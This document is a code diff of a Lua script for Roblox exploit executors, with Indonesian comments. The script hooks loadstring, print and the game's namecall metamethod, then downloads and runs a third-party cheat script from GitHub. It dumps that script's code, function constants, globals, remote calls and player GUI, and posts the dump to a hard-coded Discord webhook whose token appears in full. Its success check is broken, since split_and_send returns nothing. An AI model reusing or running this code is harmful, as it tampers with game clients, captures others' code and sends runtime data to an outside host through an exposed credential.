@@ -1,52 +1,26 @@
 -- ========== KONFIGURASI ==========
-local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1450517804037046508/yi2ZuXEbsPhSQU6MaJ2fgmvm4YPGSz1G0q1oHpApUiYpRrDFCAd1-kuYC4q0sxZ8YOKY"
-local TARGET_SCRIPT_URL = "https://raw.githubusercontent.com/4LynxX/all_Game/refs/heads/main/Fish_It.lua"
+local WEBHOOK = "https://discordapp.com/api/webhooks/1450517804037046508/yi2ZuXEbsPhSQU6MaJ2fgmvm4YPGSz1G0q1oHpApUiYpRrDFCAd1-kuYC4q0sxZ8YOKY"
+local TARGET_URL = "https://raw.githubusercontent.com/4LynxX/all_Game/refs/heads/main/Fish_It.lua"
 -- ==================================
-
--- Fungsi kirim ke Discord (support potongan besar)
-local function send_to_discord(content, codeblock_lang)
-    codeblock_lang = codeblock_lang or ""
-    local message = content
-    if #content > 1900 then
-        -- Potong jadi beberapa bagian
-        local parts = {}
-        for i = 1, #content, 1900 do
-            table.insert(parts, string.sub(content, i, i+1899))
-        end
-        for _, part in ipairs(parts) do
-            local data = { content = "```" .. codeblock_lang .. "\n" .. part .. "```" }
-            local json = game:GetService("HttpService"):JSONEncode(data)
-            pcall(function()
-                syn.request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = json })
-            end)
-            task.wait(0.5)
-        end
-    else
-        local data = { content = "```" .. codeblock_lang .. "\n" .. content .. "```" }
-        local json = game:GetService("HttpService"):JSONEncode(data)
-        pcall(function()
-            syn.request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = json })
-        end)
-    end
-end
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
 
--- Data yang akan dikumpulkan
-local captured_loadstrings = {}  -- { code }
+-- ========== DATA COLLECTION TABLES ==========
+local captured_loadstrings = {}
 local captured_prints = {}
-local ui_elements = {}  -- { window_name, buttons, toggles, sliders }
+local ui_calls = {}
 local global_vars = {}
-local gc_functions = {}
+local gc_funcs = {}
 local remote_calls = {}
-local gui_structure = {}
+local gui_objects = {}
 
+-- ========== HOOKS (harus sebelum target script di-load) ==========
 -- Hook loadstring
 local old_loadstring = loadstring
 loadstring = function(code, chunkname)
-    table.insert(captured_loadstrings, { chunk = chunkname, code = code })
+    table.insert(captured_loadstrings, {chunk = chunkname or "?", code = code})
     return old_loadstring(code, chunkname)
 end
 
@@ -54,201 +28,196 @@ end
 local old_print = print
 print = function(...)
     local args = {...}
-    local str = table.concat(args, " ")
-    table.insert(captured_prints, str)
+    table.insert(captured_prints, table.concat(args, " "))
     old_print(...)
 end
 
--- Hook UI library (deteksi otomatis)
-local ui_libs = {"MakeWindow", "CreateWindow", "AddButton", "AddToggle", "AddSlider", "AddLabel", "AddTab", "NewWindow"}
-for _, lib in ipairs(ui_libs) do
-    if _G[lib] and type(_G[lib]) == "function" then
-        local old = _G[lib]
-        _G[lib] = function(...)
-            local args = {...}
-            table.insert(ui_elements, { func = lib, args = args })
+-- Hook UI library (generic)
+local ui_patterns = {"MakeWindow", "CreateWindow", "AddButton", "AddToggle", "AddSlider", "AddLabel", "AddTab", "NewWindow"}
+for _, name in ipairs(ui_patterns) do
+    if _G[name] and type(_G[name]) == "function" then
+        local old = _G[name]
+        _G[name] = function(...)
+            table.insert(ui_calls, {func = name, args = {...}})
             return old(...)
         end
     end
 end
 
--- Hook RemoteEvent / RemoteFunction (global untuk semua instance)
-local old_namecall = nil
+-- Hook RemoteEvent/Function
 local mt = getrawmetatable(game)
 if mt and mt.__namecall then
-    old_namecall = mt.__namecall
+    local old_namecall = mt.__namecall
     mt.__namecall = function(self, ...)
         local method = getnamecallmethod()
         if (self:IsA("RemoteEvent") or self:IsA("RemoteFunction")) and (method == "FireServer" or method == "InvokeServer") then
-            local args = {...}
-            table.insert(remote_calls, { remote = self.Name, method = method, args = args })
+            table.insert(remote_calls, {remote = self.Name, method = method, args = {...}})
         end
         return old_namecall(self, ...)
     end
 end
 
--- Load script target
-local function load_target_script()
-    local raw = game:HttpGet(TARGET_SCRIPT_URL)
+-- ========== LOAD TARGET SCRIPT ==========
+local function load_target()
+    local raw = game:HttpGet(TARGET_URL)
     local fn, err = loadstring(raw)
     if fn then
         pcall(fn)
+        return true
     else
-        send_to_discord("Gagal load script: " .. tostring(err), "")
+        table.insert(captured_prints, "LOAD ERROR: " .. tostring(err))
+        return false
     end
 end
 
--- Tunggu script berjalan (beri waktu 5 detik untuk inisialisasi)
-load_target_script()
-task.wait(5)
+load_target()
+task.wait(4)  -- beri waktu inisialisasi
 
+-- ========== POST-EXTRACTION DATA DUMP ==========
 -- Dump _G
 for k, v in pairs(_G) do
-    if type(v) == "table" then
-        local sub = {}
-        for k2, v2 in pairs(v) do
-            sub[tostring(k2)] = tostring(v2):sub(1, 100)
-        end
-        global_vars[tostring(k)] = sub
+    if type(v) == "function" then
+        global_vars[tostring(k)] = "<function>"
+    elseif type(v) == "table" then
+        global_vars[tostring(k)] = "<table>"
     else
-        global_vars[tostring(k)] = tostring(v):sub(1, 200)
+        global_vars[tostring(k)] = tostring(v)
     end
 end
 
--- Dump getgc (fungsi dari script target)
-local function is_target_function(func)
-    local info = debug.getinfo(func, "S")
-    return info and info.source and (string.find(info.source, "Fish_It") or string.find(info.source, "Lynx"))
-end
-
+-- Dump getgc
 for _, func in ipairs(getgc(true)) do
-    if type(func) == "function" and is_target_function(func) then
-        local info = debug.getinfo(func, "Sln")
-        local constants = debug.getconstants and debug.getconstants(func) or {}
-        table.insert(gc_functions, {
-            source = info.source,
-            lines = info.linedefined .. "-" .. info.lastlinedefined,
-            constants = constants
-        })
-    end
-end
-
--- Dump GUI (PlayerGui)
-local function scan_gui(instance, depth, path)
-    depth = depth or 0
-    path = path or instance.Name
-    for _, child in ipairs(instance:GetChildren()) do
-        if child:IsA("ScreenGui") or child:IsA("Frame") or child:IsA("TextButton") or child:IsA("TextLabel") then
-            local data = {
-                name = child.Name,
-                class = child.ClassName,
-                path = path .. "." .. child.Name,
-                props = {}
-            }
-            for _, prop in ipairs(child:GetProperties()) do
-                if prop:match("Text") or prop:match("Visible") or prop:match("Position") or prop:match("Size") then
-                    data.props[prop] = tostring(child[prop])
+    if type(func) == "function" then
+        local info = debug.getinfo(func, "S")
+        if info and info.source and (string.find(info.source, "Fish") or string.find(info.source, "Lynx") or string.find(info.source, "@")) then
+            local constants = debug.getconstants and debug.getconstants(func) or {}
+            local const_strings = {}
+            for _, c in ipairs(constants) do
+                if type(c) == "string" and #c > 3 then
+                    table.insert(const_strings, c)
                 end
             end
-            table.insert(gui_structure, data)
-            scan_gui(child, depth+1, data.path)
+            if #const_strings > 0 then
+                table.insert(gc_funcs, {src = info.source, consts = const_strings})
+            end
+        end
+    end
+end
+
+-- Dump PlayerGui
+local function scan_gui(parent, path)
+    path = path or parent.Name
+    for _, child in ipairs(parent:GetChildren()) do
+        if child:IsA("ScreenGui") or child:IsA("Frame") or child:IsA("TextButton") or child:IsA("TextLabel") then
+            local props = {}
+            for _, prop in ipairs(child:GetProperties()) do
+                if prop:match("Text") or prop:match("Visible") or prop:match("Position") or prop:match("Size") then
+                    props[prop] = tostring(child[prop])
+                end
+            end
+            table.insert(gui_objects, {name = child.Name, class = child.ClassName, path = path.."."..child.Name, props = props})
+            scan_gui(child, path.."."..child.Name)
         end
     end
 end
 pcall(scan_gui, Players.LocalPlayer.PlayerGui)
 
--- Kirim semua data ke Discord
-
--- 1. Kirim loadstring chunks
-if #captured_loadstrings > 0 then
-    local dump = ""
+-- ========== FORMAT OUTPUT ==========
+local function build_full_report()
+    local parts = {}
+    
+    parts[#parts+1] = "=== LOADSTRINGS ==="
     for i, ls in ipairs(captured_loadstrings) do
-        dump = dump .. string.format("-- [%d] %s\n%s\n\n", i, ls.chunk or "?", ls.code)
-        if #dump > 1800 then
-            send_to_discord(dump, "lua")
-            dump = ""
+        parts[#parts+1] = string.format("-- [%d] %s\n%s\n", i, ls.chunk, ls.code)
+    end
+    
+    parts[#parts+1] = "\n=== UI CALLS ==="
+    for _, ui in ipairs(ui_calls) do
+        parts[#parts+1] = string.format("%s(%s)", ui.func, HttpService:JSONEncode(ui.args))
+    end
+    
+    parts[#parts+1] = "\n=== GLOBAL VARIABLES ==="
+    for k, v in pairs(global_vars) do
+        parts[#parts+1] = k .. " = " .. v
+    end
+    
+    parts[#parts+1] = "\n=== GC FUNCTIONS (strings) ==="
+    for _, f in ipairs(gc_funcs) do
+        parts[#parts+1] = "-- " .. f.src
+        for _, s in ipairs(f.consts) do
+            parts[#parts+1] = "const: " .. s
         end
     end
-    if #dump > 0 then send_to_discord(dump, "lua") end
-else
-    send_to_discord("Tidak ada loadstring yang tertangkap.", "")
-end
-
--- 2. Kirim UI elements
-if #ui_elements > 0 then
-    local ui_dump = ""
-    for _, ui in ipairs(ui_elements) do
-        ui_dump = ui_dump .. ui.func .. "(" .. HttpService:JSONEncode(ui.args) .. ")\n"
-        if #ui_dump > 1800 then
-            send_to_discord(ui_dump, "lua")
-            ui_dump = ""
-        end
-    end
-    if #ui_dump > 0 then send_to_discord(ui_dump, "lua") end
-else
-    send_to_discord("Tidak ada UI library yang terdeteksi.", "")
-end
-
--- 3. Kirim global variables (ringkasan)
-local global_dump = ""
-for k, v in pairs(global_vars) do
-    global_dump = global_dump .. k .. " = " .. tostring(v) .. "\n"
-    if #global_dump > 1800 then
-        send_to_discord(global_dump, "")
-        global_dump = ""
-    end
-end
-if #global_dump > 0 then send_to_discord(global_dump, "") end
-
--- 4. Kirim fungsi dari GC
-if #gc_functions > 0 then
-    local gc_dump = ""
-    for _, f in ipairs(gc_functions) do
-        gc_dump = gc_dump .. string.format("-- %s [%s]\n", f.source, f.lines)
-        for _, c in ipairs(f.constants) do
-            if type(c) == "string" and #c > 5 then
-                gc_dump = gc_dump .. "const: " .. c .. "\n"
-            end
-        end
-        gc_dump = gc_dump .. "\n"
-        if #gc_dump > 1800 then
-            send_to_discord(gc_dump, "lua")
-            gc_dump = ""
-        end
-    end
-    if #gc_dump > 0 then send_to_discord(gc_dump, "lua") end
-end
-
--- 5. Kirim remote calls
-if #remote_calls > 0 then
-    local remote_dump = ""
+    
+    parts[#parts+1] = "\n=== REMOTE CALLS ==="
     for _, rc in ipairs(remote_calls) do
-        remote_dump = remote_dump .. string.format("%s:%s(%s)\n", rc.remote, rc.method, HttpService:JSONEncode(rc.args))
-        if #remote_dump > 1800 then
-            send_to_discord(remote_dump, "")
-            remote_dump = ""
+        parts[#parts+1] = string.format("%s:%s(%s)", rc.remote, rc.method, HttpService:JSONEncode(rc.args))
+    end
+    
+    parts[#parts+1] = "\n=== GUI STRUCTURE ==="
+    for _, g in ipairs(gui_objects) do
+        parts[#parts+1] = g.path .. " (" .. g.class .. ")"
+        for k, v in pairs(g.props) do
+            parts[#parts+1] = "  " .. k .. " = " .. v
         end
     end
-    if #remote_dump > 0 then send_to_discord(remote_dump, "") end
+    
+    parts[#parts+1] = "\n=== PRINT OUTPUTS ==="
+    parts[#parts+1] = table.concat(captured_prints, "\n")
+    
+    return table.concat(parts, "\n")
 end
 
--- 6. Kirim GUI structure
-if #gui_structure > 0 then
-    local gui_dump = ""
-    for _, g in ipairs(gui_structure) do
-        gui_dump = gui_dump .. string.format("%s (%s) - %s\n", g.path, g.class, HttpService:JSONEncode(g.props)) .. "\n"
-        if #gui_dump > 1800 then
-            send_to_discord(gui_dump, "")
-            gui_dump = ""
+local report = build_full_report()
+local timestamp = os.time()
+
+-- ========== SEND TO DISCORD (dengan fallback) ==========
+local function send_to_discord(content)
+    local json_body = HttpService:JSONEncode({content = content:sub(1, 1990)})
+    local success = false
+    
+    if syn and syn.request then
+        success = pcall(function()
+            syn.request({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json_body})
+        end)
+    elseif http_request then
+        success = pcall(function()
+            http_request({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json_body})
+        end)
+    elseif HttpService.PostAsync then
+        success = pcall(function()
+            HttpService:PostAsync(WEBHOOK, json_body, Enum.HttpContentType.ApplicationJson)
+        end)
+    end
+    
+    return success
+end
+
+local function split_and_send()
+    local max_len = 1900
+    if #report <= max_len then
+        send_to_discord(report)
+    else
+        for i = 1, #report, max_len do
+            local part = report:sub(i, i+max_len-1)
+            send_to_discord(part)
+            task.wait(1)
         end
     end
-    if #gui_dump > 0 then send_to_discord(gui_dump, "") end
 end
 
--- 7. Kirim captured prints (jika ada)
-if #captured_prints > 0 then
-    local print_dump = table.concat(captured_prints, "\n")
-    send_to_discord(print_dump, "")
-end
+local sent = split_and_send()
 
-send_to_discord("=== Ekstraksi selesai ===", "")
+-- ========== FALLBACK: SAVE TO FILE ==========
+if not sent then
+    if writefile then
+        local filename = "extraction_" .. timestamp .. ".txt"
+        writefile(filename, report)
+        print("Gagal kirim ke Discord. Data disimpan ke file: " .. filename)
+    else
+        print("GAGAL: Tidak bisa kirim ke Discord dan tidak ada writefile. Data berikut:")
+        print(report:sub(1, 500))
+    end
+else
+    print("Berhasil mengirim data ke Discord!")
+end
